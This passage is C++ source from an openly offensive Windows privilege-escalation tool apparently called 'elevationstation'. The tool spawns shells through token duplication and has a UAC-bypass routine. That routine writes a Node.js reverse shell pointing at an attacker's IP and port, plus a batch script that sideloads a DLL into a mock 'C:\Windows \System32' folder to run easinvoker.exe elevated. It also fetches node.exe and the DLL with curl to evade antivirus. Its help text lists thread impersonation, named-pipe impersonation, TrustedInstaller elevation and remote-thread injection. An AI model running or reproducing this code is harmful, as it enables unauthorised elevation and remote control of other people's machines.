    StartupInfo.lpDesktop = const_cast<wchar_t*>(L"WinSta0\\Default");
    // Create the new process using CreateProcessWithTokenW in a new, separate console
    // to the reader: use -dt for duplicatethread token for shell within same console

/*
        bRet = CreateProcessAsUser(hNewToken, NULL, wszProcessName, NULL, NULL, TRUE, dwCreationFlags, lpEnvironment, pwszCurrentDirectory, &StartupInfo, &ProcInfo);

        if (bRet == 0)
        {
            printf("[!] CreateProcessAsUser didn't cooperate...going to try CreateProcessWithToken method\n");
            printf("Return value: %d\n", GetLastError());
        }
        else
        {
            printf("[+] CreateProcessAsUser worked!!!\n");
            printf("Return value: %d\n", bRet);
            fflush(stdout);
            WaitForSingleObject(ProcInfo.hProcess, INFINITE);
            exit(0);
        }
*/
    bRet = CreateProcessWithTokenW(hNewToken, NULL, NULL, wszProcessName, dwCreationFlags, lpEnvironment, pwszCurrentDirectory, &StartupInfo, &ProcInfo);

    if (bRet == 0)
    {
        Color(14);
        printf("[!] CreateProcessWithToken didn't cooperate...permissions maybe???\n");
        Color(7);
        printf("Return value: %d\n", GetLastError());
    }
    else
    {
        Color(2);
        printf("[+] CreateProcessWithToken worked!!!\n");
        Color(7);
        printf("Return value: %d\n", bRet);
        fflush(stdout);
        WaitForSingleObject(ProcInfo.hProcess, INFINITE);
    }
    CloseHandle(hNewToken);
    CloseHandle(proc2);
    CloseHandle(tok2);
    return 0;

}

void uacbypass(char* theip, char* theport)
{
    DWORD procintegrity=CheckProcessIntegrity(GetCurrentProcessId());
    if (procintegrity != 0x3000)
    {
        Color(14);
        printf("[!] current process is NOT elevated...time to work some magic!\n");
        Color(7);
    }
    else
    {
        Color(2);
        printf("[+] already elevated!  Exiting...\n");
        Color(7);
        exit(0);
    }
    
    
    string revip = theip;
    string portnum = theport;
    
    cout << "generating rev shell payload now...\n";
    //string revip, portnum;
    //cout << "enter the ip for your attacker box for the rev3rse sh3ll:\n";
    //cin >> revip;
    //cout << "enter the port number for the rev3rse sh3ll:\n";
    //cin >> portnum;

    ofstream mypayload;
    mypayload.open("c:\\users\\public\\elevationstation.js");
    mypayload << "(function(){\n";
    mypayload << "var net = require(\"net\"),\n";
    mypayload << "cp = require(\"child_process\"),\n";
    mypayload << "sh = cp.spawn(\"cmd.exe\", []);\n";
    mypayload << "var client = new net.Socket();\n";
    mypayload << "client.connect(";
    mypayload << portnum << ", " << "\"" << revip << "\", function(){\n";
    mypayload << "client.pipe(sh.stdin);\n";
    mypayload << "sh.stdout.pipe(client);\n";
    mypayload << "sh.stderr.pipe(client);\n";
    mypayload << "});\n";
    mypayload << "return /a/;\n";
    mypayload << "})();\n";
    mypayload.close();
    Color(2);
    cout << ".js rev shell payload created! It's located at: C:\\users\\public\\elevationstation.js\n";
    Color(7);
    cout << "now, we need to generate the uac bypass script...\n";
    ofstream uacbyppayload;
    uacbyppayload.open("c:\\users\\public\\elevateit.bat");
    uacbyppayload << "@echo off\n";
    uacbyppayload << "mkdir \"\\\\?\\C:\\Windows \"\n";
    uacbyppayload << "mkdir \"\\\\?\\C:\\Windows \\System32\"\n";
    uacbyppayload << "copy \"c:\\windows\\system32\\easinvoker.exe\" \"C:\\Windows \\System32\\\"\n";
    uacbyppayload << "cd c:\\temp\n";
    uacbyppayload << "copy \"netutils.dll\" \"C:\\Windows \\System32\\\"\n";
    uacbyppayload << "\"C:\\Windows \\System32\\easinvoker.exe\"\n";
    uacbyppayload << "del /q \"C:\\Windows \\System32\\*\"\n";
    uacbyppayload << "rmdir \"C:\\Windows \\System32\\\"\n";
    uacbyppayload << "rmdir \"C:\\Windows \\\"\n";
    uacbyppayload.close();
    Color(2);
    cout << "[+] uac byp@ss script created! It's located at: C:\\users\\public\\elevateit.bat\n";
    Color(7);
    cout << "Downloading necessary scripts...\n";
    printf("Downloading node.exe portable binary to use for reverse shell and to help stay under the radar from AV detection ;)\n");
    WinExec("curl -# -L -o \"c:\\users\\public\\n0de.exe\" \"https://nodejs.org/download/release/latest/win-x64/node.exe\"", 0); //download directly from nodejs file repo
    WinExec("curl -# -L -o \"c:\\temp\\netutils.dll\" \"https://github.com/g3tsyst3m/elevationstation/raw/main/uacbypass_files/netutils.dll\"", 0); //UAC byp@ss DLL, downloaded directly from the elevationstation repo folder
    Color(2);
    cout << "[+] while waiting for download to finish, go ahead and start your listener on your attacker box\n";
    //cout << "You can see the download progress for two files in your foothold reverse shell ;)\nhit [enter] when both reach 100 percent and enjoy your newly spawned elevated shell!\n";
    Color(7);
    Sleep(7000);
    //cin.get();
    //cin.get();
    WinExec("c:\\users\\public\\elevateit.bat", 0);

}

//-WindowStyle hidden 
void commandlist()
{
    printf("Options:\n -p 'process id'\n -cpi 'check process integrity'\n -d 'Technique: duplicate process token (spawns separate shell)'\n -dt 'Technique: duplicate process thread impersonation token and convert to primary token (spawns shell within current console!)'\n -np 'named pipe impersonation method'\n -ti 'Become Trusted Installer!'\n -uac 'uac bypass and elevate standard user (must be member of admin group)'\n -i 'CreateRemoteThread injection (reverse shell default config | port: 4445 / ip: 192.168.1.50)'\n");
    printf("usage: elevationstation.exe -p 1234 -cpi\n");
    printf("usage: elevationstation.exe -p 1234 -d\n");
    printf("usage: elevationstation.exe -p 1234 -dt\n");
    printf("usage: elevationstation.exe -np\n");
    printf("usage: elevationstation.exe -ti\n");
    printf("usage: elevationstation.exe -uac [attackerip] [port]\n");
    printf("usage: elevationstation.exe -p 1234 -i\n");
}
int main(int argc, char* argv[])
{
    //printf("argc: %d", argc);
    DWORD pid;
    if (argc == 1 || argc < 4 && strcmp(argv[1], "-np") != 0 && strcmp(argv[1], "-uac") != 0 && strcmp(argv[1], "-ti") != 0 && strcmp(argv[1], "-h") != 0)
    {
        Color(2);
        printf("elevationstation.exe -h [lists all commands]\n");
        Color(7);
        exit(0);
    }
    /*
    printf("argc count: %d\n", argc);
    for (int a = 0; a < argc; a++)
    {
        printf("arg %d: %s\n", a, argv[a]);
    }
    */
  
    if (strcmp(argv[1], "-h") == 0)
    {
        commandlist();
        exit(0);
    }
    if (strcmp(argv[1], "-uac") == 0)
    {
        uacbypass(argv[2], argv[3]);
        exit(0);
    }
    if (strcmp(argv[1], "-ti") == 0)
    {
        DupThreadToken(0, true);
        exit(0);
    }
    
    if (strcmp(argv[1], "-np") == 0)
    {
        bool piperet=NamedPipeImpersonate();
        WinExec("cmd.exe /c sc delete plumber", 0);
        exit(0);

    }

    if (strcmp(argv[1], "-p") == 0)
    {
        if (strcmp(argv[3], "-d") == 0)
        {
            pid = atoi(argv[2]);
            DupProcessToken(pid);
            exit(0);
        }
        if (strcmp(argv[3], "-dt") == 0)
        {
            pid = atoi(argv[2]);
            DupThreadToken(pid, false);
            exit(0);
        }
        if (strcmp(argv[3], "-i") == 0)
        {
            pid = atoi(argv[2]);
            Inj3ct0r(pid);
            exit(0);
        }

    }
    if (strcmp(argv[1], "-p") == 0)
    {
        if (strcmp(argv[3], "-cpi") == 0)
        {
            pid = atoi(argv[2]);
            CheckProcessIntegrity(pid);
            exit(0);
        }

    }

    printf("[!] hmm...I don't understand that parameter option\n");

}



